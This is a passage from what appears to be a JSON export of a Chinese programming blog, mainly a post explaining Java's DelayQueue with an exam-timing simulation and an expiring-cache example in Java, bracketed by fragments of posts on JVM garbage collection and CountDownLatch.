&#x901A;&#x8FC7;&#x5206;&#x6790;dump&#x6587;&#x4EF6;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x6BCF;&#x4E2A;1&#x5C0F;&#x65F6;&#x90FD;&#x4F1A;&#x53D1;&#x751F;&#x4E00;&#x6B21;Full GC&#xFF0C;&#x7ECF;&#x8FC7;&#x591A;&#x65B9;&#x6C42;&#x8BC1;&#xFF0C;&#x53EA;&#x8981;&#x5728;JVM&#x4E2D;&#x5F00;&#x542F;&#x4E86;JMX&#x670D;&#x52A1;&#xFF0C;JMX&#x5C06;&#x4F1A;1&#x5C0F;&#x65F6;&#x6267;&#x884C;&#x4E00;&#x6B21;Full GC&#x4EE5;&#x6E05;&#x9664;&#x5F15;&#x7528;&#xFF0C;&#x5173;&#x4E8E;&#x8FD9;&#x70B9;&#x8BF7;&#x53C2;&#x8003;&#x9644;&#x4EF6;&#x6587;&#x6863;&#x3002; 4.&#x7A0B;&#x5E8F;&#x7B97;&#x6CD5;&#x8C03;&#x4F18;&#xFF1A;&#x672C;&#x6B21;&#x4E0D;&#x4F5C;&#x4E3A;&#x91CD;&#x70B9;","raw":null,"content":null,"categories":[],"tags":[{"name":"JVM","slug":"JVM","permalink":"http://www.wangxin123.com/tags/JVM/"}]},{"title":"DelayQueue使用","slug":"DelayQueue使用","date":"2016-04-16T15:42:13.000Z","updated":"2017-02-07T12:14:19.148Z","comments":true,"path":"2016/04/16/DelayQueue使用/","link":"","permalink":"http://www.wangxin123.com/2016/04/16/DelayQueue使用/","excerpt":"&#x5047;&#x8BBE;&#x73B0;&#x6709;&#x5982;&#x4E0B;&#x7684;&#x4F7F;&#x7528;&#x573A;&#x666F;&#xFF1A;a) &#x5173;&#x95ED;&#x7A7A;&#x95F2;&#x8FDE;&#x63A5;&#x3002;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#xFF0C;&#x6709;&#x5F88;&#x591A;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x7A7A;&#x95F2;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x4E4B;&#x540E;&#x9700;&#x8981;&#x5173;&#x95ED;&#x4E4B;&#x3002;b) &#x7F13;&#x5B58;&#x3002;&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x8D85;&#x8FC7;&#x4E86;&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#xFF0C;&#x9700;&#x8981;&#x4ECE;&#x7F13;&#x5B58;&#x4E2D;&#x79FB;&#x51FA;&#x3002;c) &#x4EFB;&#x52A1;&#x8D85;&#x65F6;&#x5904;&#x7406;&#x3002;&#x5728;&#x7F51;&#x7EDC;&#x534F;&#x8BAE;&#x6ED1;&#x52A8;&#x7A97;&#x53E3;&#x8BF7;&#x6C42;&#x5E94;&#x7B54;&#x5F0F;&#x4EA4;&#x4E92;&#x65F6;&#xFF0C;&#x5904;&#x7406;&#x8D85;&#x65F6;&#x672A;&#x54CD;&#x5E94;&#x7684;&#x8BF7;&#x6C42;&#x3002; &#x7B28;&#x529E;&#x6CD5;&#x662F;&#xFF0C;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x540E;&#x53F0;&#x7EBF;&#x7A0B;&#xFF0C;&#x904D;&#x5386;&#x6240;&#x6709;&#x5BF9;&#x8C61;&#xFF0C;&#x6328;&#x4E2A;&#x68C0;&#x67E5;&#x3002;&#x4F46;&#x5BF9;&#x8C61;&#x6570;&#x91CF;&#x8FC7;&#x591A;&#x65F6;&#xFF0C;&#x5B58;&#x5728;&#x6027;&#x80FD;&#x95EE;&#x9898;&#xFF0C;&#x68C0;&#x67E5;&#x95F4;&#x9694;&#x65F6;&#x95F4;&#x4E0D;&#x597D;&#x8BBE;&#x7F6E;&#xFF0C;&#x95F4;&#x9694;&#x65F6;&#x95F4;&#x8FC7;&#x5927;&#xFF0C;&#x5F71;&#x54CD;&#x7CBE;&#x786E;&#x5EA6;&#xFF0C;&#x591A;&#x5C0F;&#x5219;&#x5B58;&#x5728;&#x6548;&#x7387;&#x95EE;&#x9898;&#x3002;&#x800C;&#x4E14;&#x505A;&#x4E0D;&#x5230;&#x6309;&#x8D85;&#x65F6;&#x7684;&#x65F6;&#x95F4;&#x987A;&#x5E8F;&#x5904;&#x7406;&#x3002; &#x8FD9;&#x573A;&#x666F;&#xFF0C;&#x4F7F;&#x7528;DelayQueue&#x6700;&#x9002;&#x5408;&#x4E86;&#x3002;Delayed &#x5143;&#x7D20;&#x7684;&#x4E00;&#x4E2A;&#x65E0;&#x754C;&#x963B;&#x585E;&#x961F;&#x5217;&#xFF0C;&#x53EA;&#x6709;&#x5728;&#x5EF6;&#x8FDF;&#x671F;&#x6EE1;&#x65F6;&#x624D;&#x80FD;&#x4ECE;&#x4E2D;&#x63D0;&#x53D6;&#x5143;&#x7D20;&#x3002;&#x8BE5;&#x961F;&#x5217;&#x7684;&#x5934;&#x90E8;&#x662F;&#x5EF6;&#x8FDF;&#x671F;&#x6EE1;&#x540E;&#x4FDD;&#x5B58;&#x65F6;&#x95F4;&#x6700;&#x957F;&#x7684;Delayed&#x5143;&#x7D20;&#xFF08;&#x5373;&#x6700;&#x60F3;&#x4F18;&#x5148;&#x5904;&#x7406;&#x7684;&#x5143;&#x7D20;&#xFF09;&#x3002;&#x5982;&#x679C;&#x5EF6;&#x8FDF;&#x90FD;&#x8FD8;&#x6CA1;&#x6709;&#x671F;&#x6EE1;&#xFF0C;&#x5219;&#x961F;&#x5217;&#x6CA1;&#x6709;&#x5934;&#x90E8;&#xFF0C;&#x5E76;&#x4E14; poll &#x5C06;&#x8FD4;&#x56DE; null&#x3002;&#x5F53;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x7684; getDelay(TimeUnit.NANOSECONDS) &#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E; 0 &#x7684;&#x503C;&#x65F6;&#xFF0C;&#x5C06;&#x53D1;&#x751F;&#x5230;&#x671F;&#x3002;&#x5373;&#x4F7F;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;take&#x6216;poll&#x79FB;&#x9664;&#x672A;&#x5230;&#x671F;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x4E5F;&#x4E0D;&#x4F1A;&#x5C06;&#x8FD9;&#x4E9B;&#x5143;&#x7D20;&#x4F5C;&#x4E3A;&#x6B63;&#x5E38;&#x5143;&#x7D20;&#x5BF9;&#x5F85;&#x3002;&#x4F8B;&#x5982;&#xFF0C;size&#x65B9;&#x6CD5;&#x540C;&#x65F6;&#x8FD4;&#x56DE;&#x5230;&#x671F;&#x548C;&#x672A;&#x5230;&#x671F;&#x5143;&#x7D20;&#x7684;&#x8BA1;&#x6570;&#x3002;&#x6B64;&#x961F;&#x5217;&#x4E0D;&#x5141;&#x8BB8;&#x4F7F; null&#x5143;&#x7D20;&#x3002;","keywords":null,"text":"&#x5047;&#x8BBE;&#x73B0;&#x6709;&#x5982;&#x4E0B;&#x7684;&#x4F7F;&#x7528;&#x573A;&#x666F;&#xFF1A;a) &#x5173;&#x95ED;&#x7A7A;&#x95F2;&#x8FDE;&#x63A5;&#x3002;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#xFF0C;&#x6709;&#x5F88;&#x591A;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x7A7A;&#x95F2;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x4E4B;&#x540E;&#x9700;&#x8981;&#x5173;&#x95ED;&#x4E4B;&#x3002;b) &#x7F13;&#x5B58;&#x3002;&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x8D85;&#x8FC7;&#x4E86;&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#xFF0C;&#x9700;&#x8981;&#x4ECE;&#x7F13;&#x5B58;&#x4E2D;&#x79FB;&#x51FA;&#x3002;c) &#x4EFB;&#x52A1;&#x8D85;&#x65F6;&#x5904;&#x7406;&#x3002;&#x5728;&#x7F51;&#x7EDC;&#x534F;&#x8BAE;&#x6ED1;&#x52A8;&#x7A97;&#x53E3;&#x8BF7;&#x6C42;&#x5E94;&#x7B54;&#x5F0F;&#x4EA4;&#x4E92;&#x65F6;&#xFF0C;&#x5904;&#x7406;&#x8D85;&#x65F6;&#x672A;&#x54CD;&#x5E94;&#x7684;&#x8BF7;&#x6C42;&#x3002; &#x7B28;&#x529E;&#x6CD5;&#x662F;&#xFF0C;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x540E;&#x53F0;&#x7EBF;&#x7A0B;&#xFF0C;&#x904D;&#x5386;&#x6240;&#x6709;&#x5BF9;&#x8C61;&#xFF0C;&#x6328;&#x4E2A;&#x68C0;&#x67E5;&#x3002;&#x4F46;&#x5BF9;&#x8C61;&#x6570;&#x91CF;&#x8FC7;&#x591A;&#x65F6;&#xFF0C;&#x5B58;&#x5728;&#x6027;&#x80FD;&#x95EE;&#x9898;&#xFF0C;&#x68C0;&#x67E5;&#x95F4;&#x9694;&#x65F6;&#x95F4;&#x4E0D;&#x597D;&#x8BBE;&#x7F6E;&#xFF0C;&#x95F4;&#x9694;&#x65F6;&#x95F4;&#x8FC7;&#x5927;&#xFF0C;&#x5F71;&#x54CD;&#x7CBE;&#x786E;&#x5EA6;&#xFF0C;&#x591A;&#x5C0F;&#x5219;&#x5B58;&#x5728;&#x6548;&#x7387;&#x95EE;&#x9898;&#x3002;&#x800C;&#x4E14;&#x505A;&#x4E0D;&#x5230;&#x6309;&#x8D85;&#x65F6;&#x7684;&#x65F6;&#x95F4;&#x987A;&#x5E8F;&#x5904;&#x7406;&#x3002; &#x8FD9;&#x573A;&#x666F;&#xFF0C;&#x4F7F;&#x7528;DelayQueue&#x6700;&#x9002;&#x5408;&#x4E86;&#x3002;Delayed &#x5143;&#x7D20;&#x7684;&#x4E00;&#x4E2A;&#x65E0;&#x754C;&#x963B;&#x585E;&#x961F;&#x5217;&#xFF0C;&#x53EA;&#x6709;&#x5728;&#x5EF6;&#x8FDF;&#x671F;&#x6EE1;&#x65F6;&#x624D;&#x80FD;&#x4ECE;&#x4E2D;&#x63D0;&#x53D6;&#x5143;&#x7D20;&#x3002;&#x8BE5;&#x961F;&#x5217;&#x7684;&#x5934;&#x90E8;&#x662F;&#x5EF6;&#x8FDF;&#x671F;&#x6EE1;&#x540E;&#x4FDD;&#x5B58;&#x65F6;&#x95F4;&#x6700;&#x957F;&#x7684;Delayed&#x5143;&#x7D20;&#xFF08;&#x5373;&#x6700;&#x60F3;&#x4F18;&#x5148;&#x5904;&#x7406;&#x7684;&#x5143;&#x7D20;&#xFF09;&#x3002;&#x5982;&#x679C;&#x5EF6;&#x8FDF;&#x90FD;&#x8FD8;&#x6CA1;&#x6709;&#x671F;&#x6EE1;&#xFF0C;&#x5219;&#x961F;&#x5217;&#x6CA1;&#x6709;&#x5934;&#x90E8;&#xFF0C;&#x5E76;&#x4E14; poll &#x5C06;&#x8FD4;&#x56DE; null&#x3002;&#x5F53;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x7684; getDelay(TimeUnit.NANOSECONDS) &#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E; 0 &#x7684;&#x503C;&#x65F6;&#xFF0C;&#x5C06;&#x53D1;&#x751F;&#x5230;&#x671F;&#x3002;&#x5373;&#x4F7F;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;take&#x6216;poll&#x79FB;&#x9664;&#x672A;&#x5230;&#x671F;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x4E5F;&#x4E0D;&#x4F1A;&#x5C06;&#x8FD9;&#x4E9B;&#x5143;&#x7D20;&#x4F5C;&#x4E3A;&#x6B63;&#x5E38;&#x5143;&#x7D20;&#x5BF9;&#x5F85;&#x3002;&#x4F8B;&#x5982;&#xFF0C;size&#x65B9;&#x6CD5;&#x540C;&#x65F6;&#x8FD4;&#x56DE;&#x5230;&#x671F;&#x548C;&#x672A;&#x5230;&#x671F;&#x5143;&#x7D20;&#x7684;&#x8BA1;&#x6570;&#x3002;&#x6B64;&#x961F;&#x5217;&#x4E0D;&#x5141;&#x8BB8;&#x4F7F; null&#x5143;&#x7D20;&#x3002; DelayQueue&#x961F;&#x5217;&#x4E2D;&#x4FDD;&#x5B58;&#x7684;&#x662F;&#x5B9E;&#x73B0;&#x4E86;Delayed&#x63A5;&#x53E3;&#x7684;&#x5B9E;&#x73B0;&#x7C7B;&#xFF0C;&#x91CC;&#x9762;&#x5FC5;&#x987B;&#x5B9E;&#x73B0;getDelay()&#x548C;compareTo()&#x65B9;&#x6CD5;&#x3002;&#x524D;&#x8005;&#x7528;&#x4E8E;&#x53D6;DelayQueue&#x91CC;&#x9762;&#x7684;&#x5143;&#x7D20;&#x65F6;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5230;&#x4E86;&#x5EF6;&#x65F6;&#x65F6;&#x95F4;&#xFF0C;&#x5426;&#x5219;&#x4E0D;&#x4E88;&#x83B7;&#x53D6;&#xFF0C;&#x662F;&#x5219;&#x83B7;&#x53D6;&#x3002; compareTo()&#x65B9;&#x6CD5;&#x7528;&#x4E8E;&#x8FDB;&#x884C;&#x961F;&#x5217;&#x5185;&#x90E8;&#x7684;&#x6392;&#x5E8F;&#x3002;compareTo &#x65B9;&#x6CD5;&#x9700;&#x63D0;&#x4F9B;&#x4E0E; getDelay &#x65B9;&#x6CD5;&#x4E00;&#x81F4;&#x7684;&#x6392;&#x5E8F;&#x3002; DelayQueue = BlockingQueue + PriorityQueue + DelayedPriorityBlockingQueue = BlockingQueue + PriorityQueueDelayQueue&#x7684;&#x5173;&#x952E;&#x5143;&#x7D20;BlockingQueue&#x3001;PriorityQueue&#x3001;Delayed&#x3002;&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x8BF4;&#xFF0C;DelayQueue&#x662F;&#x4E00;&#x4E2A;&#x4F7F;&#x7528;&#x4F18;&#x5148;&#x961F;&#x5217;&#xFF08;PriorityQueue&#xFF09;&#x5B9E;&#x73B0;&#x7684;BlockingQueue&#xFF0C;&#x4F18;&#x5148;&#x961F;&#x5217;&#x7684;&#x6BD4;&#x8F83;&#x57FA;&#x51C6;&#x503C;&#x662F;&#x65F6;&#x95F4;&#x3002;&#x901A;&#x8FC7;PriorityQueue&#xFF0C;&#x53EF;&#x4EE5;&#x4F18;&#x5148;&#x5904;&#x7406;&#x6700;&#x7D27;&#x6025;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x5229;&#x7528;BlockingQueue&#xFF0C;&#x80FD;&#x9632;&#x6B62;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x4E0D;&#x65AD;&#x8F6E;&#x8BE2;&#xFF0C;&#x63D0;&#x9AD8;&#x4E86;&#x6027;&#x80FD;&#x3002;&#x5728;&#x5F88;&#x591A;&#x9700;&#x8981;&#x56DE;&#x6536;&#x5BF9;&#x8C61;&#x7684;&#x573A;&#x666F;&#x90FD;&#x80FD;&#x7528;&#x4E0A;&#x3002; &#x4EE3;&#x7801;&#x793A;&#x4F8B;&#x573A;&#x666F;&#x4E00;&#x6A21;&#x62DF;&#x4E00;&#x4E2A;&#x8003;&#x8BD5;&#x7684;&#x65E5;&#x5B50;&#xFF0C;&#x8003;&#x8BD5;&#x65F6;&#x95F4;&#x4E3A;120&#x5206;&#x949F;&#xFF0C;30&#x5206;&#x949F;&#x540E;&#x624D;&#x53EF;&#x4EA4;&#x5377;&#xFF0C;&#x5F53;&#x65F6;&#x95F4;&#x5230;&#x4E86;&#xFF0C;&#x6216;&#x5B66;&#x751F;&#x90FD;&#x4EA4;&#x5B8C;&#x5377;&#x4E86;&#x8003;&#x8BD5;&#x7ED3;&#x675F;&#x3002;&#x4E3B;&#x8981;&#x6CE8;&#x610F;&#x7684;&#xFF1A;1&#x3001;&#x8003;&#x8BD5;&#x65F6;&#x95F4;&#x4E3A;120&#x5206;&#x949F;&#xFF0C;30&#x5206;&#x949F;&#x540E;&#x624D;&#x53EF;&#x4EA4;&#x5377;&#xFF0C;&#x521D;&#x59CB;&#x5316;&#x8003;&#x751F;&#x5B8C;&#x6210;&#x8BD5;&#x5377;&#x65F6;&#x95F4;&#x6700;&#x5C0F;&#x5E94;&#x4E3A;30&#x5206;&#x949F;2&#x3001;&#x5BF9;&#x4E8E;&#x80FD;&#x591F;&#x5728;120&#x5206;&#x949F;&#x5185;&#x4EA4;&#x5377;&#x7684;&#x8003;&#x751F;&#xFF0C;&#x5982;&#x4F55;&#x5B9E;&#x73B0;&#x8FD9;&#x4E9B;&#x8003;&#x751F;&#x4EA4;&#x5377;3&#x3001;&#x5BF9;&#x4E8E;120&#x5206;&#x949F;&#x5185;&#x6CA1;&#x6709;&#x5B8C;&#x6210;&#x8003;&#x8BD5;&#x7684;&#x8003;&#x751F;&#xFF0C;&#x5728;120&#x5206;&#x949F;&#x8003;&#x8BD5;&#x65F6;&#x95F4;&#x5230;&#x540E;&#x9700;&#x8981;&#x8BA9;&#x4ED6;&#x4EEC;&#x5F3A;&#x5236;&#x4EA4;&#x5377;4&#x3001;&#x5728;&#x6240;&#x6709;&#x7684;&#x8003;&#x751F;&#x90FD;&#x4EA4;&#x5B8C;&#x5377;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x5C06;&#x63A7;&#x5236;&#x7EBF;&#x7A0B;&#x5173;&#x95ED; &#x4E0B;&#x9762;&#x662F;&#x81EA;&#x5DF1;&#x4FEE;&#x6539;&#x4E86;&#x7684;&#x4EE3;&#x7801;&#xFF1A;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171package com.bbk.demo;import java.util.Iterator;import java.util.Random;import java.util.concurrent.CountDownLatch;import java.util.concurrent.DelayQueue;import java.util.concurrent.Delayed;import java.util.concurrent.TimeUnit;/** * DelayQueue * @author wasim * @project Demo * @create at 2015-10-6 &#x4E0B;&#x5348;4:37:31 */public class Exam { public static void main(String[] args) throws InterruptedException { int studentNumber = 20; CountDownLatch countDownLatch = new CountDownLatch(studentNumber+1); DelayQueue&lt; Student&gt; students = new DelayQueue&lt;Student&gt;(); Random random = new Random(); for (int i = 0; i &lt; studentNumber; i++) { students.put(new Student(&quot;student&quot;+(i+1), 30+random.nextInt(120),countDownLatch)); } Thread teacherThread =new Thread(new Teacher(students)); students.put(new EndExam(students, 120,countDownLatch,teacherThread)); teacherThread.start(); countDownLatch.await(); System.out.println(&quot; &#x8003;&#x8BD5;&#x65F6;&#x95F4;&#x5230;&#xFF0C;&#x5168;&#x90E8;&#x4EA4;&#x5377;&#xFF01;&quot;); }}class Student implements Runnable,Delayed{ private String name; private long workTime; private long submitTime; private boolean isForce = false; private CountDownLatch countDownLatch; public Student(){} public Student(String name,long workTime,CountDownLatch countDownLatch){ this.name = name; this.workTime = workTime; //&#x63D0;&#x4EA4;&#x65F6;&#x95F4; = &#x5F53;&#x524D;&#x65F6;&#x95F4; + &#x4F5C;&#x7B54;&#x65F6;&#x95F4; this.submitTime = TimeUnit.NANOSECONDS.convert(workTime, TimeUnit.NANOSECONDS)+System.nanoTime(); this.countDownLatch = countDownLatch; } @Override public int compareTo(Delayed o) { // &#x6309;&#x7167;&#x4F5C;&#x7B54;&#x65F6;&#x957F;&#x6B63;&#x5E8F;&#x6392;&#x5E8F;&#xFF08;&#x961F;&#x5934;&#x653E;&#x7684;&#x662F;&#x4F60;&#x8BA4;&#x4E3A;&#x6700;&#x5148;&#x9700;&#x8981;&#x5904;&#x7406;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x4F53;&#x73B0;&#x4E3A;&#x9700;&#x8981;&#x6700;&#x5148;&#x4EA4;&#x5377;&#xFF0C;&#x6240;&#x4EE5;&#x662F;&#x6B63;&#x5E8F;&#xFF09; if(o == null || ! (o instanceof Student)) return 1; if(o == this) return 0; Student s = (Student)o; if (this.workTime &gt; s.workTime) { return 1; }else if (this.workTime == s.workTime) { return 0; }else { return -1; } } @Override public long getDelay(TimeUnit unit) { // &#x63D0;&#x4EA4;&#x65F6;&#x95F4; - &#x5F53;&#x524D;&#x65F6;&#x95F4; &#x7528;&#x6765;&#x5224;&#x65AD;&#x5EF6;&#x8FDF;&#x662F;&#x5426;&#x5230;&#x671F;&#xFF08;&#x5373;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x63D0;&#x4EA4;&#x8BD5;&#x5377;&#xFF0C;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;take&#x6216;&#x8005;poll&#xFF09; // &#x8FD4;&#x56DE;&#x6B63;&#x6570;&#xFF1A;&#x5EF6;&#x8FDF;&#x8FD8;&#x6709;&#x591A;&#x5C11;&#x65F6;&#x95F4;&#x5230;&#x671F;&#x3002;&#x8D1F;&#x6570;&#xFF1A;&#x5EF6;&#x8FDF;&#x5DF2;&#x7ECF;&#x5728;&#x591A;&#x957F;&#x65F6;&#x95F4;&#x524D;&#x5230;&#x671F;&#x3002;&#x8D1F;&#x6570;&#x4EE3;&#x8868;&#x53EF;&#x4EE5;take&#x6216;&#x8005;poll return unit.convert(submitTime - System.nanoTime(), TimeUnit.NANOSECONDS); } @Override public void run() { if (isForce) { System.out.println(name + &quot; &#x4EA4;&#x5377;, &#x5E0C;&#x671B;&#x7528;&#x65F6;&quot; + workTime + &quot;&#x5206;&#x949F;&quot;+&quot; ,&#x5B9E;&#x9645;&#x7528;&#x65F6; 120&#x5206;&#x949F;&quot; ); }else { System.out.println(name + &quot; &#x4EA4;&#x5377;, &#x5E0C;&#x671B;&#x7528;&#x65F6;&quot; + workTime + &quot;&#x5206;&#x949F;&quot;+&quot; ,&#x5B9E;&#x9645;&#x7528;&#x65F6; &quot;+workTime +&quot; &#x5206;&#x949F;&quot;); } countDownLatch.countDown(); } public boolean isForce() { return isForce; } public void setForce(boolean isForce) { this.isForce = isForce; } public String getName() { return name; } public void setName(String name) { this.name = name; } public long getWorkTime() { return workTime; } public void setWorkTime(long workTime) { this.workTime = workTime; } public long getSubmitTime() { return submitTime; } public void setSubmitTime(long submitTime) { this.submitTime = submitTime; } }class EndExam extends Student{ private DelayQueue&lt;Student&gt; students; private CountDownLatch countDownLatch; private Thread teacherThread; public EndExam(DelayQueue&lt;Student&gt; students, long workTime, CountDownLatch countDownLatch,Thread teacherThread) { super(&quot;&#x5F3A;&#x5236;&#x6536;&#x5377;&quot;, workTime,countDownLatch); this.students = students; this.countDownLatch = countDownLatch; this.teacherThread = teacherThread; } @Override public void run() { teacherThread.interrupt(); Student tmpStudent; for (Iterator&lt;Student&gt; iterator2 = students.iterator(); iterator2.hasNext();) { tmpStudent = iterator2.next(); tmpStudent.setForce(true); System.out.println(tmpStudent.getName()+&quot;===&quot;+tmpStudent.getDelay(TimeUnit.NANOSECONDS)); tmpStudent.run(); } countDownLatch.countDown(); } }class Teacher implements Runnable{ private DelayQueue&lt;Student&gt; students; public Teacher(DelayQueue&lt;Student&gt; students){ this.students = students; } @Override public void run() { try { System.out.println(&quot; test start&quot;); while(!Thread.interrupted()){ Student s = students.take(); System.out.println(s.getName()+&quot;===&quot;+s.getDelay(TimeUnit.NANOSECONDS)); s.run(); } } catch (Exception e) { e.printStackTrace(); } } } &#x573A;&#x666F;&#x4E8C;&#x5411;&#x7F13;&#x5B58;&#x6DFB;&#x52A0;&#x5185;&#x5BB9;&#x65F6;&#xFF0C;&#x7ED9;&#x6BCF;&#x4E00;&#x4E2A;key&#x8BBE;&#x5B9A;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#xFF0C;&#x7CFB;&#x7EDF;&#x81EA;&#x52A8;&#x5C06;&#x8D85;&#x8FC7;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x7684;key&#x6E05;&#x9664;&#x3002;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF1A;1&#x3001;&#x5F53;&#x5411;&#x7F13;&#x5B58;&#x4E2D;&#x6DFB;&#x52A0;key-value&#x5BF9;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x8FD9;&#x4E2A;key&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#x5B58;&#x5728;&#x5E76;&#x4E14;&#x8FD8;&#x6CA1;&#x6709;&#x8FC7;&#x671F;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x8FD9;&#x4E2A;key&#x5BF9;&#x5E94;&#x7684;&#x65B0;&#x8FC7;&#x671F;&#x65F6;&#x95F4;2&#x3001;&#x4E3A;&#x4E86;&#x80FD;&#x591F;&#x8BA9;DelayQueue&#x5C06;&#x5176;&#x5DF2;&#x4FDD;&#x5B58;&#x7684;key&#x5220;&#x9664;&#xFF0C;&#x9700;&#x8981;&#x91CD;&#x5199;&#x5B9E;&#x73B0;Delayed&#x63A5;&#x53E3;&#x6DFB;&#x52A0;&#x5230;DelayQueue&#x7684;DelayedItem&#x7684;hashCode&#x51FD;&#x6570;&#x548C;equals&#x51FD;&#x6570;3&#x3001;&#x5F53;&#x7F13;&#x5B58;&#x5173;&#x95ED;&#xFF0C;&#x76D1;&#x63A7;&#x7A0B;&#x5E8F;&#x4E5F;&#x5E94;&#x5173;&#x95ED;&#xFF0C;&#x56E0;&#x800C;&#x76D1;&#x63A7;&#x7EBF;&#x7A0B;&#x5E94;&#x5F53;&#x7528;&#x5B88;&#x62A4;&#x7EBF;&#x7A0B; &#x7F51;&#x4E0A;&#x641C;&#x5230;&#x7684;&#x76F8;&#x5173;&#x4EE3;&#x7801;&#xFF1A;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132/** *Cache.java * * Created on 2014-1-11 &#x4E0A;&#x5348;11:30:36 by sunzhenchao mychaoyue2011@163.com */public class Cache&lt;K, V&gt; { public ConcurrentHashMap&lt;K, V&gt; map = new ConcurrentHashMap&lt;K, V&gt;(); public DelayQueue&lt;DelayedItem&lt;K&gt;&gt; queue = new DelayQueue&lt;DelayedItem&lt;K&gt;&gt;(); public void put(K k,V v,long liveTime){ V v2 = map.put(k, v); DelayedItem&lt;K&gt; tmpItem = new DelayedItem&lt;K&gt;(k, liveTime); if (v2 != null) { queue.remove(tmpItem); } queue.put(tmpItem); } public Cache(){ Thread t = new Thread(){ @Override public void run(){ dameonCheckOverdueKey(); } }; t.setDaemon(true); t.start(); } public void dameonCheckOverdueKey(){ while (true) { DelayedItem&lt;K&gt; delayedItem = queue.poll(); if (delayedItem != null) { map.remove(delayedItem.getT()); System.out.println(System.nanoTime()+&quot; remove &quot;+delayedItem.getT() +&quot; from cache&quot;); } try { Thread.sleep(300); } catch (Exception e) { // TODO: handle exception } } } /** * TODO * @param args * 2014-1-11 &#x4E0A;&#x5348;11:30:36 * @author:&#x5B59;&#x632F;&#x8D85; * @throws InterruptedException */ public static void main(String[] args) throws InterruptedException { Random random = new Random(); int cacheNumber = 10; int liveTime = 0; Cache&lt;String, Integer&gt; cache = new Cache&lt;String, Integer&gt;(); for (int i = 0; i &lt; cacheNumber; i++) { liveTime = random.nextInt(3000); System.out.println(i+&quot; &quot;+liveTime); cache.put(i+&quot;&quot;, i, random.nextInt(liveTime)); if (random.nextInt(cacheNumber) &gt; 7) { liveTime = random.nextInt(3000); System.out.println(i+&quot; &quot;+liveTime); cache.put(i+&quot;&quot;, i, random.nextInt(liveTime)); } } Thread.sleep(3000); System.out.println(); }}class DelayedItem&lt;T&gt; implements Delayed{ private T t; private long liveTime ; private long removeTime; public DelayedItem(T t,long liveTime){ this.setT(t); this.liveTime = liveTime; this.removeTime = TimeUnit.NANOSECONDS.convert(liveTime, TimeUnit.NANOSECONDS) + System.nanoTime(); } @Override public int compareTo(Delayed o) { if (o == null) return 1; if (o == this) return 0; if (o instanceof DelayedItem){ DelayedItem&lt;T&gt; tmpDelayedItem = (DelayedItem&lt;T&gt;)o; if (liveTime &gt; tmpDelayedItem.liveTime ) { return 1; }else if (liveTime == tmpDelayedItem.liveTime) { return 0; }else { return -1; } } long diff = getDelay(TimeUnit.NANOSECONDS) - o.getDelay(TimeUnit.NANOSECONDS); return diff &gt; 0 ? 1:diff == 0? 0:-1; } @Override public long getDelay(TimeUnit unit) { return unit.convert(removeTime - System.nanoTime(), unit); } public T getT() { return t; } public void setT(T t) { this.t = t; } @Override public int hashCode(){ return t.hashCode(); } @Override public boolean equals(Object object){ if (object instanceof DelayedItem) { return object.hashCode() == hashCode() ?true:false; } return false; } }","raw":null,"content":null,"categories":[{"name":"WEB后端","slug":"WEB后端","permalink":"http://www.wangxin123.com/categories/WEB后端/"}],"tags":[{"name":"concurrent","slug":"concurrent","permalink":"http://www.wangxin123.com/tags/concurrent/"}]},{"title":"countDownLatch和cyclicBarrier","slug":"countDownLatch和cyclicBarrier","date":"2016-04-16T15:16:16.000Z","updated":"2016-11-17T11:59:42.672Z","comments":true,"path":"2016/04/16/countDownLatch和cyclicBarrier/","link":"","permalink":"http://www.wangxin123.com/2016/04/16/countDownLatch和cyclicBarrier/","excerpt":"&#x300A; Effecit In Java &#x300B;&#x8BF4;&#x8FC7;&#xFF0C;&#x4ECE;java 1.5&#x53D1;&#x73B0;&#x7248;&#x672C;&#x5F00;&#x59CB;, 